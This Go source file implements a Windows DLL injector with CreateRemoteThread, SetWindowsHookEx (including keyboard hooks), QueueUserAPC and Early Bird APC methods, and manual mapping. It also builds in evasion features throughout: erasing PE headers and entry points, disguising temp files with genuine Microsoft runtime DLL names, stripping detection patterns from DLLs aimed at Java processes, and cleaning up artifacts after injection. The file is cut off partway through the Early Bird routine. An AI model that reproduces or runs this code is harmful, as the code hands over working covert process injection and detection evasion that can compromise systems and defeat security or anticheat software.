package injector

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type InjectionMethod int

const (
	StandardInjection InjectionMethod = iota
)

type BypassOptions struct {
	MemoryLoad            bool
	ErasePEHeader         bool
	EraseEntryPoint       bool
	ManualMapping         bool
	InvisibleMemory       bool
	PathSpoofing          bool
	LegitProcessInjection bool
	PTESpoofing           bool
	VADManipulation       bool
	RemoveVADNode         bool
	ThreadStackAllocation bool
	DirectSyscalls        bool
	SkipDllMain           bool
}

type Injector struct {
	dllPath            string
	processID          uint32
	method             InjectionMethod
	bypassOptions      BypassOptions
	enhancedOptions    EnhancedBypassOptions
	useEnhancedOptions bool
	logger             Logger
}

const (
	DefaultTimeoutShort  = 5 * time.Second
	DefaultTimeoutMedium = 10 * time.Second
	DefaultTimeoutLong   = 15 * time.Second
)

func NewInjector(dllPath string, processID uint32, logger Logger) *Injector {
	return &Injector{
		dllPath:   dllPath,
		processID: processID,
		method:    StandardInjection,
		logger:    logger,
	}
}

func (i *Injector) SetMethod(method InjectionMethod) {
	i.method = method
}

func (i *Injector) SetBypassOptions(options BypassOptions) {

	i.validateBypassCompatibility(&options)
	i.bypassOptions = options
	i.useEnhancedOptions = false
}

func (i *Injector) validateBypassCompatibility(options *BypassOptions) {

	usingSafeMethods := options.MemoryLoad || options.ManualMapping

	if options.ErasePEHeader {
		if usingSafeMethods {

			i.logger.Debug("PE header erasure enabled with safe injection method")
		} else {
			switch i.method {
			case StandardInjection:
				i.logger.Warn("PE header erasure may cause issues with LoadLibrary-based injection methods")
				i.logger.Warn("Consider using Memory Load or Manual Mapping for safer PE header erasure")
			}
		}
	}

	if options.EraseEntryPoint {
		if usingSafeMethods {

			i.logger.Debug("Entry point erasure enabled with safe injection method")
		} else {
			switch i.method {
			case StandardInjection:
				i.logger.Warn("Entry point erasure may cause DLL functionality issues with LoadLibrary-based methods")
				i.logger.Warn("Consider using Memory Load or Manual Mapping for safer entry point erasure")
			}
		}
	}

	if (options.ErasePEHeader || options.EraseEntryPoint) && !usingSafeMethods {
		i.logger.Info("Recommendation: Enable Memory Load or Manual Mapping for safer PE/entry point erasure")
	}
}

func (i *Injector) SetEnhancedBypassOptions(options EnhancedBypassOptions) {
	i.enhancedOptions = options
	i.useEnhancedOptions = true
}

func (i *Injector) validateConfiguration() error {
	if i.logger == nil {
		return fmt.Errorf("logger not initialized")
	}

	if i.dllPath == "" {
		i.logger.Error("DLL path is empty")
		return fmt.Errorf("DLL path cannot be empty")
	}

	if i.processID == 0 {
		i.logger.Error("Process ID is invalid")
		return fmt.Errorf("process ID cannot be 0")
	}

	if i.method != StandardInjection {
		return fmt.Errorf("invalid injection method: %d (only StandardInjection is supported)", i.method)
	}

	return nil
}

func (i *Injector) Inject() error {

	if err := i.validateConfiguration(); err != nil {
		return fmt.Errorf("configuration validation failed: %v", err)
	}

	if err := ValidateProcessAccess(i.processID); err != nil {
		i.logger.Error("Process access validation failed", "error", err)
		return err
	}

	fileInfo, err := os.Stat(i.dllPath)
	if os.IsNotExist(err) {
		i.logger.Error("DLL file does not exist", "path", i.dllPath)
		return fmt.Errorf("DLL file does not exist: %s", i.dllPath)
	}
	i.logger.Info("DLL file found", "path", i.dllPath, "size", fileInfo.Size())

	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		i.logger.Error("Failed to read DLL file", "error", err)
		return fmt.Errorf("failed to read DLL file: %v", err)
	}

	// CRITICAL: Clean InjGen patterns from DLL bytes BEFORE validation/injection
	// This removes patterns at the source, preventing detection
	if i.isJavaProcess() {
		i.logger.Info("Java process detected - cleaning InjGen patterns from DLL bytes")
		dllBytes = ReplaceInjGenPatterns(dllBytes)
		i.logger.Info("InjGen patterns cleaned from DLL bytes", "dll_size", len(dllBytes))
	}

	if err := IsValidPEFile(dllBytes); err != nil {
		i.logger.Error("Invalid PE file", "error", err)
		return fmt.Errorf("invalid PE file: %v", err)
	}
	
	// Clean artifacts after successful injection
	defer func() {
		if err == nil {
			cleaner := NewArtifactCleaner(i.logger)
			if cleanErr := cleaner.CleanAllArtifacts(i.dllPath); cleanErr != nil {
				i.logger.Warn("Failed to clean injection artifacts", "error", cleanErr)
			} else {
				i.logger.Info("Injection artifacts cleaned successfully")
			}
		}
	}()

	i.logger.Info("Performing comprehensive architecture analysis")
	archCompat, err := ValidateDLLCompatibility(i.processID, dllBytes)
	if err != nil {
		i.logger.Error("Architecture compatibility check failed", "error", err)
		return fmt.Errorf("architecture compatibility check failed: %v", err)
	}

	i.logger.Info("Architecture analysis completed",
		"process_arch", archCompat.ProcessArch.ProcessArch,
		"dll_arch", archCompat.DLLArch.Architecture,
		"compatible", archCompat.Compatible,
		"is_wow64", archCompat.ProcessArch.IsWow64)

	if !archCompat.Compatible {
		i.logger.Error("Architecture mismatch detected")
		for _, recommendation := range archCompat.Recommendations {
			i.logger.Error("Recommendation", "suggestion", recommendation)
		}
		return fmt.Errorf("architecture mismatch: %s",
			archCompat.Recommendations[0])
	}

	for _, recommendation := range archCompat.Recommendations {
		i.logger.Info("Architecture analysis", "note", recommendation)
	}

	if archCompat.ProcessArch.IsWow64 {
		i.logger.Info("WOW64 process detected - applying WOW64-specific optimizations")
	}

	signedDllBytes, err := i.handleDLLSignature(dllBytes)
	if err != nil {
		i.logger.Warn("Signature processing failed", "error", err)

		signedDllBytes = dllBytes
	} else {

		dllBytes = signedDllBytes
	}

	var tempSignedPath string
	if !i.bypassOptions.MemoryLoad && !i.bypassOptions.ManualMapping {

		needsDiskFile := i.method == StandardInjection ||
			i.bypassOptions.PathSpoofing

		if needsDiskFile && len(signedDllBytes) != len(dllBytes) {

			tempSignedPath, err = i.saveTempSignedDLL(signedDllBytes)
			if err != nil {
				i.logger.Warn("Failed to save temporary signed file", "error", err)
			} else {

				originalPath := i.dllPath
				i.dllPath = tempSignedPath
				defer func() {

					os.Remove(tempSignedPath)
					i.dllPath = originalPath
				}()
			}
		}
	}

	i.logger.Info("Starting injection with auto-recovery", "method", methodToString(i.method), "dll", i.dllPath, "pid", i.processID)

	LogInjectionAttempt(methodToString(i.method), i.processID, i.dllPath, false)

	injectionErr := i.attemptInjectionWithRecovery(dllBytes)

	LogInjectionAttempt(methodToString(i.method), i.processID, i.dllPath, injectionErr == nil)

	SecureCleanup(dllBytes)

	if injectionErr != nil {
		i.logger.Error("Injection failed", "error", injectionErr)
		return injectionErr
	}

	i.logger.Info("Injection completed successfully")
	return nil
}

func (i *Injector) createTempDllFile(dllBytes []byte) (string, error) {
	tempDir := os.TempDir()

	realDllNames := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
	}

	fileName := realDllNames[i.processID%uint32(len(realDllNames))]
	tempFile := filepath.Join(tempDir, fileName)

	err := os.WriteFile(tempFile, dllBytes, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to create temporary DLL file: %v", err)
	}

	return tempFile, nil
}

func (i *Injector) findLoadedDLLBaseAddress(hProcess windows.Handle, dllPath string) (uintptr, error) {

	dllName := filepath.Base(dllPath)

	var moduleHandle windows.Handle
	var cbNeeded uint32
	var modules [1024]windows.Handle

	psapi := windows.NewLazySystemDLL("psapi.dll")
	enumProcessModules := psapi.NewProc("EnumProcessModules")
	getModuleBaseNameW := psapi.NewProc("GetModuleBaseNameW")
	getModuleInformation := psapi.NewProc("GetModuleInformation")

	ret, _, _ := enumProcessModules.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(moduleHandle))),
		uintptr(unsafe.Pointer(&cbNeeded)))

	if ret == 0 {
		return 0, fmt.Errorf("failed to enumerate process modules")
	}

	moduleCount := cbNeeded / uint32(unsafe.Sizeof(moduleHandle))

	for i := uint32(0); i < moduleCount; i++ {
		var moduleInfo struct {
			BaseOfDll   uintptr
			SizeOfImage uint32
			EntryPoint  uintptr
		}

		ret, _, _ := getModuleInformation.Call(
			uintptr(hProcess),
			uintptr(modules[i]),
			uintptr(unsafe.Pointer(&moduleInfo)),
			unsafe.Sizeof(moduleInfo))

		if ret == 0 {
			continue
		}

		var moduleName [260]uint16
		ret, _, _ = getModuleBaseNameW.Call(
			uintptr(hProcess),
			uintptr(modules[i]),
			uintptr(unsafe.Pointer(&moduleName[0])),
			uintptr(len(moduleName)))

		if ret == 0 {
			continue
		}

		moduleNameStr := windows.UTF16ToString(moduleName[:])
		if strings.EqualFold(moduleNameStr, dllName) {
			return moduleInfo.BaseOfDll, nil
		}
	}

	return 0, fmt.Errorf("DLL not found in process modules: %s", dllName)
}

func (i *Injector) manualMapDLL(dllBytes []byte) error {
	i.logger.Info("Using advanced manual mapping method")

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	baseAddress, err := i.AdvancedManualMapping(hProcess, dllBytes)
	if err != nil {
		i.logger.Error("Advanced manual mapping failed", "error", err)
		return fmt.Errorf("advanced manual mapping failed: %v", err)
	}

	i.logger.Info("Advanced manual mapping successful", "base_address", fmt.Sprintf("0x%X", baseAddress))

	if i.useEnhancedOptions {
		err = i.applyEnhancedInjectionTechniques(hProcess, baseAddress, uintptr(len(dllBytes)), dllBytes)
		if err != nil {
			i.logger.Warn("Enhanced techniques failed", "error", err)
		}
	}

	return nil
}

func (i *Injector) manualMapDLLWithOptions(hProcess windows.Handle, dllBytes []byte) (uintptr, error) {
	i.logger.Info("Starting manual mapping with bypass options")

	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return 0, fmt.Errorf("failed to parse PE header: %v", err)
	}

	imageSize := peHeader.GetSizeOfImage()
	i.logger.Info("PE image size", "size", imageSize)

	var baseAddress uintptr

	if i.bypassOptions.InvisibleMemory {
		i.logger.Info("Using invisible memory allocation")
		baseAddress, err = InvisibleMemoryAllocation(hProcess, uintptr(imageSize))
		if err != nil {
			return 0, fmt.Errorf("invisible memory allocation failed: %v", err)
		}
	} else {

		baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return 0, fmt.Errorf("failed to allocate memory: %v", err)
		}
	}

	i.logger.Info("Memory allocated", "address", fmt.Sprintf("0x%X", baseAddress))

	err = i.MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("failed to map PE sections: %v", err)
	}

	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		i.logger.Warn("Failed to process relocations", "error", err)

	}

	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		i.logger.Warn("Failed to resolve imports", "error", err)

	}

	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
	if err != nil {
		i.logger.Warn("Failed to execute DLL entry point", "error", err)

	}

	return baseAddress, nil
}

func (i *Injector) legitProcessInject(dllBytes []byte) error {
	i.logger.Info("Using legitimate process injection")

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	err = LegitimateProcessInjection(hProcess, dllBytes)
	if err != nil {
		i.logger.Error("Legitimate process injection failed", "error", err)
		return fmt.Errorf("legitimate process injection failed: %v", err)
	}

	i.logger.Info("Legitimate process injection successful")
	return nil
}

func (i *Injector) standardInject() error {
	i.logger.Info("Using standard injection method", "dll", i.dllPath, "pid", i.processID)

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err, "pid", i.processID)

		if err.Error() == "Access is denied." {
			return fmt.Errorf("access denied - target process may be protected or require elevated privileges (WARNING: only use elevated privileges for legitimate testing)")
		}
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	i.logger.Info("Successfully opened target process", "handle", hProcess)

	var exitCode uint32
	err = windows.GetExitCodeProcess(hProcess, &exitCode)
	if err == nil && exitCode != 259 {
		i.logger.Error("Target process is not running", "exit_code", exitCode)
		return fmt.Errorf("target process has exited with code %d", exitCode)
	}

	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		i.logger.Warn("Failed to get absolute path", "error", err)
		absPath = i.dllPath
	}
	i.logger.Info("Using DLL path", "absolute_path", absPath)

	dllPathBytes := []byte(absPath + "\x00")
	pathSize := len(dllPathBytes)
	i.logger.Info("Allocating memory for DLL path", "path", absPath, "size", pathSize)

	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		i.logger.Error("Failed to allocate memory", "error", err, "size", pathSize)
		return fmt.Errorf("failed to allocate memory: %v", err)
	}
	i.logger.Info("Successfully allocated memory", "address", fmt.Sprintf("0x%X", memAddr))

	defer func() {
		if memAddr != 0 && err != nil {

			VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
			i.logger.Debug("Freed allocated memory due to error", "address", fmt.Sprintf("0x%X", memAddr))
		}
	}()

	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		i.logger.Error("Failed to write DLL path", "error", err, "address", fmt.Sprintf("0x%X", memAddr))
		return fmt.Errorf("failed to write DLL path: %v", err)
	}
	i.logger.Info("Successfully wrote DLL path", "bytes_written", bytesWritten, "expected", pathSize)

	if bytesWritten != uintptr(pathSize) {
		i.logger.Error("Incomplete write", "written", bytesWritten, "expected", pathSize)
		return fmt.Errorf("incomplete write: wrote %d bytes, expected %d", bytesWritten, pathSize)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()
	i.logger.Info("LoadLibraryA address", "address", fmt.Sprintf("0x%X", loadLibraryAddr))

	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		i.logger.Error("DLL file does not exist", "path", absPath)
		return fmt.Errorf("DLL file does not exist: %s", absPath)
	}

	var threadID uint32
	i.logger.Info("Creating remote thread", "entry_point", fmt.Sprintf("0x%X", loadLibraryAddr), "parameter", fmt.Sprintf("0x%X", memAddr))

	threadHandle, err := CreateRemoteThread(hProcess, nil, 0,
		loadLibraryAddr, memAddr, 0, &threadID)
	if err != nil {
		i.logger.Error("Failed to create remote thread", "error", err, "loadlibrary_addr", fmt.Sprintf("0x%X", loadLibraryAddr), "param_addr", fmt.Sprintf("0x%X", memAddr))
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Successfully created remote thread", "thread_id", threadID, "handle", threadHandle)

	i.logger.Info("Waiting for thread completion...")
	waitResult, err := windows.WaitForSingleObject(threadHandle, uint32(DefaultTimeoutMedium.Milliseconds()))
	if err != nil {
		i.logger.Error("Failed to wait for thread", "error", err)
		return fmt.Errorf("failed to wait for thread: %v", err)
	}

	switch waitResult {
	case uint32(windows.WAIT_TIMEOUT):
		i.logger.Error("Thread execution timed out")
		return fmt.Errorf("thread execution timed out after 10 seconds")
	case uint32(windows.WAIT_OBJECT_0):
		i.logger.Info("Thread completed successfully")

		var exitCode uint32
		ret, _, _ := procGetExitCodeThread.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&exitCode)))
		if ret != 0 {
			i.logger.Info("Thread exit code", "code", exitCode, "hex", fmt.Sprintf("0x%X", exitCode))
			if exitCode == 0 {
				i.logger.Error("LoadLibrary failed - exit code 0")
				return fmt.Errorf("LoadLibrary failed - DLL could not be loaded. Check DLL dependencies and architecture")
			} else {
				i.logger.Info("LoadLibrary succeeded", "dll_base", fmt.Sprintf("0x%X", exitCode))
			}
		} else {
			i.logger.Warn("Failed to get thread exit code")
		}
	default:
		i.logger.Error("Unexpected wait result", "result", waitResult)
		return fmt.Errorf("unexpected wait result: %d", waitResult)
	}

	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint {
		i.logger.Info("Applying post-injection anti-detection techniques")
		i.logger.Warn("WARNING: PE/Entry point erasure with LoadLibrary-based injection may cause instability")

		time.Sleep(2 * time.Second)

		var exitCode uint32
		ret, _, _ := procGetExitCodeThread.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&exitCode)))
		if ret != 0 && exitCode != 0 {
			dllBaseAddress := uintptr(exitCode)

			if i.bypassOptions.ErasePEHeader {
				i.logger.Warn("Applying PE header erasure - this may affect DLL functionality")
				if err := ErasePEHeaderSafely(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase PE header", "error", err)
				} else {
					i.logger.Info("PE header erased successfully (with safety measures)")
				}
			}

			if i.bypassOptions.EraseEntryPoint {
				i.logger.Warn("Applying entry point erasure - this may affect DLL unloading")
				if err := EraseEntryPointSafely(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase entry point", "error", err)
				} else {
					i.logger.Info("Entry point erased successfully (with safety measures)")
				}
			}
		} else {
			i.logger.Warn("Could not get DLL base address for post-injection techniques")
		}
	}

	i.logger.Info("Standard injection completed successfully")
	return nil
}

func (i *Injector) setWindowsHookExInject() error {
	i.logger.Info("Using SetWindowsHookEx injection method")

	if _, err := os.Stat(i.dllPath); os.IsNotExist(err) {
		i.logger.Error("DLL file does not exist", "path", i.dllPath)
		return fmt.Errorf("DLL file does not exist: %s", i.dllPath)
	}

	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		i.logger.Warn("Failed to get absolute path", "error", err)
		absPath = i.dllPath
	}

	dllBytes, err := os.ReadFile(absPath)
	if err != nil {
		return fmt.Errorf("failed to read DLL: %v", err)
	}

	if !i.validateHookDLL(dllBytes) {
		i.logger.Error("DLL does not export required hook procedures")
		return fmt.Errorf("DLL must export hook procedures like GetMsgProc, CallWndProc, etc.")
	}

	threadID, err := i.findMainThreadID()
	if err != nil {
		i.logger.Error("Failed to find main thread", "error", err)
		return fmt.Errorf("failed to find main thread: %v", err)
	}

	user32 := windows.NewLazySystemDLL("user32.dll")
	setWindowsHookEx := user32.NewProc("SetWindowsHookExW")
	unHookWindowsHookEx := user32.NewProc("UnhookWindowsHookEx")

	absPathUTF16, err := windows.UTF16PtrFromString(absPath)
	if err != nil {
		return fmt.Errorf("failed to convert path to UTF-16: %v", err)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibrary := kernel32.NewProc("LoadLibraryW")
	getModuleHandle := kernel32.NewProc("GetModuleHandleW")
	getProcAddress := kernel32.NewProc("GetProcAddress")

	moduleHandle, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(absPathUTF16)))
	if moduleHandle == 0 {

		moduleHandle, _, _ = loadLibrary.Call(uintptr(unsafe.Pointer(absPathUTF16)))
		if moduleHandle == 0 {
			return fmt.Errorf("failed to load DLL module")
		}
	}

	hookProcNames := []string{"GetMsgProc", "CallWndProc", "DllMain", "HookProc"}
	var hookProcAddr uintptr

	for _, procName := range hookProcNames {
		procNamePtr, _ := windows.BytePtrFromString(procName)
		addr, _, _ := getProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(procNamePtr)))
		if addr != 0 {
			hookProcAddr = addr
			i.logger.Info("Found hook procedure", "name", procName, "address", fmt.Sprintf("0x%X", addr))
			break
		}
	}

	if hookProcAddr == 0 {
		return fmt.Errorf("no valid hook procedure found in DLL")
	}

	hookTypes := []struct {
		hookType int
		name     string
	}{
		{3, "WH_GETMESSAGE"},
		{4, "WH_CALLWNDPROC"},
		{5, "WH_CBT"},
		{7, "WH_KEYBOARD"},
	}

	var successfulHooks []uintptr
	var lastErr error

	for _, hookType := range hookTypes {

		hookHandle, _, err := setWindowsHookEx.Call(
			uintptr(hookType.hookType),
			hookProcAddr,
			moduleHandle,
			uintptr(threadID))

		if hookHandle != 0 {
			i.logger.Info("Successfully installed hook",
				"type", hookType.name,
				"handle", fmt.Sprintf("0x%X", hookHandle),
				"thread_id", threadID)
			successfulHooks = append(successfulHooks, hookHandle)
		} else {
			i.logger.Warn("Failed to install hook", "type", hookType.name, "error", err)
			lastErr = err
		}
	}

	if len(successfulHooks) == 0 {
		return fmt.Errorf("failed to install any hooks: %v", lastErr)
	}

	err = i.triggerMessageProcessing(threadID)
	if err != nil {
		i.logger.Warn("Failed to trigger message processing", "error", err)
	}

	go func() {
		time.Sleep(5 * time.Second)
		for _, hookHandle := range successfulHooks {
			unHookWindowsHookEx.Call(hookHandle)
		}
		i.logger.Info("Cleaned up hooks", "count", len(successfulHooks))
	}()

	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint {
		i.logger.Info("Applying post-injection anti-detection techniques for SetWindowsHookEx")

		hProcess, err := windows.OpenProcess(
			windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
			false, i.processID)
		if err == nil {
			defer windows.CloseHandle(hProcess)

			dllBaseAddress := uintptr(moduleHandle)

			if i.bypassOptions.ErasePEHeader {
				if err := ErasePEHeader(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase PE header", "error", err)
				} else {
					i.logger.Info("PE header erased successfully")
				}
			}

			if i.bypassOptions.EraseEntryPoint {
				if err := EraseEntryPoint(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase entry point", "error", err)
				} else {
					i.logger.Info("Entry point erased successfully")
				}
			}
		} else {
			i.logger.Warn("Could not open process for post-injection techniques", "error", err)
		}
	}

	i.logger.Info("SetWindowsHookEx injection completed",
		"successful_hooks", len(successfulHooks),
		"thread_id", threadID)

	return nil
}

func (i *Injector) validateHookDLL(dllBytes []byte) bool {

	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		i.logger.Warn("Failed to parse PE for hook validation", "error", err)
		return true
	}


	if peHeader != nil && len(peHeader.SectionHeaders) > 0 {
		return true
	}
	return false
}

func (i *Injector) triggerMessageProcessing(threadID uint32) error {
	user32 := windows.NewLazySystemDLL("user32.dll")
	postThreadMessage := user32.NewProc("PostThreadMessageW")

	messages := []uint32{0x0400, 0x0401, 0x0402}

	for _, msg := range messages {
		ret, _, _ := postThreadMessage.Call(
			uintptr(threadID),
			uintptr(msg),
			0,
			0)

		if ret != 0 {
			i.logger.Info("Sent trigger message", "thread_id", threadID, "message", fmt.Sprintf("0x%X", msg))
		}
	}

	return nil
}

func (i *Injector) queueUserAPCInject() error {
	i.logger.Info("Using QueueUserAPC injection method")

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_SUSPEND_RESUME,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		i.logger.Warn("Failed to get absolute path", "error", err)
		absPath = i.dllPath
	}

	alertableThreads, err := i.findAlertableThreads()
	if err != nil {
		i.logger.Error("Failed to find alertable threads", "error", err)
		return fmt.Errorf("failed to find alertable threads: %v", err)
	}

	if len(alertableThreads) == 0 {
		i.logger.Warn("No alertable threads found, attempting to create alertable state")

		alertableThreads, err = i.makeThreadsAlertable()
		if err != nil {
			return fmt.Errorf("failed to make threads alertable: %v", err)
		}
	}

	dllPathBytes := []byte(absPath + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		i.logger.Error("Failed to allocate memory", "error", err)
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	success := false
	defer func() {
		if !success && memAddr != 0 {
			VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
			i.logger.Debug("Freed allocated memory", "address", fmt.Sprintf("0x%X", memAddr))
		}
	}()

	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		i.logger.Error("Failed to write DLL path", "error", err)
		return fmt.Errorf("failed to write DLL path: %v", err)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	i.logger.Info("LoadLibraryA address", "address", fmt.Sprintf("0x%X", loadLibraryAddr))

	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	successCount := 0

	for _, threadHandle := range alertableThreads {
		ret, _, err := queueUserAPC.Call(
			loadLibraryAddr,
			uintptr(threadHandle),
			memAddr)

		if ret != 0 {
			successCount++
			i.logger.Info("Successfully queued APC",
				"thread", fmt.Sprintf("0x%X", threadHandle),
				"dll_path_addr", fmt.Sprintf("0x%X", memAddr))
		} else {
			i.logger.Warn("Failed to queue APC",
				"thread", fmt.Sprintf("0x%X", threadHandle),
				"error", err)
		}
	}

	for idx, threadHandle := range alertableThreads {
		if err := windows.CloseHandle(threadHandle); err != nil {
			i.logger.Warn("Failed to close thread handle", "index", idx, "error", err)
		}
	}

	if successCount == 0 {
		return fmt.Errorf("failed to queue APC to any thread")
	}

	err = i.triggerAPCExecution()
	if err != nil {
		i.logger.Warn("Failed to trigger APC execution", "error", err)
	}

	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint {
		i.logger.Info("Applying post-injection anti-detection techniques for QueueUserAPC")

		time.Sleep(1 * time.Second)


		dllBaseAddress, err := i.findLoadedDLLBaseAddress(hProcess, absPath)
		if err != nil {
			i.logger.Warn("Could not find loaded DLL base address", "error", err)
		} else {

			if i.bypassOptions.ErasePEHeader {
				if err := ErasePEHeader(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase PE header", "error", err)
				} else {
					i.logger.Info("PE header erased successfully")
				}
			}

			if i.bypassOptions.EraseEntryPoint {
				if err := EraseEntryPoint(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase entry point", "error", err)
				} else {
					i.logger.Info("Entry point erased successfully")
				}
			}
		}
	}

	i.logger.Info("QueueUserAPC injection completed",
		"successful_apc_count", successCount,
		"total_threads", len(alertableThreads))

	return nil
}

func (i *Injector) earlyBirdAPCInject() error {
	i.logger.Info("Using Early Bird APC injection method")



	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	suspendedThreads, err := i.suspendAllThreads()
	if err != nil {
		i.logger.Error("Failed to suspend threads", "error", err)
		return fmt.Errorf("failed to suspend threads: %v", err)
	}

	i.logger.Info("Suspended threads for EarlyBird APC", "count", len(suspendedThreads))

	defer func() {
		for _, threadHandle := range suspendedThreads {
			windows.ResumeThread(threadHandle)
			windows.CloseHandle(threadHandle)
		}
		i.logger.Info("Resumed all suspended threads")
	}()

	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		absPath = i.dllPath
	}

	dllPathBytes := []byte(absPath + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		i.logger.Error("Failed to allocate memory", "error", err)
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	defer func() {
		if memAddr != 0 {
			VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
			i.logger.Debug("Freed allocated memory", "address", fmt.Sprintf("0x%X", memAddr))
		}
	}()

	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		i.logger.Error("Failed to write DLL path", "error", err)
		return fmt.Errorf("failed to write DLL path: %v", err)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	i.logger.Info("LoadLibraryA address", "address", fmt.Sprintf("0x%X", loadLibraryAddr))

	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	successCount := 0

	for _, threadHandle := range suspendedThreads {
		ret, _, err := queueUserAPC.Call(
			loadLibraryAddr,
			uintptr(threadHandle),
			memAddr)

		if ret != 0 {
			successCount++
			i.logger.Info("Successfully queued EarlyBird APC",
				"thread", fmt.Sprintf("0x%X", threadHandle))
		} else {
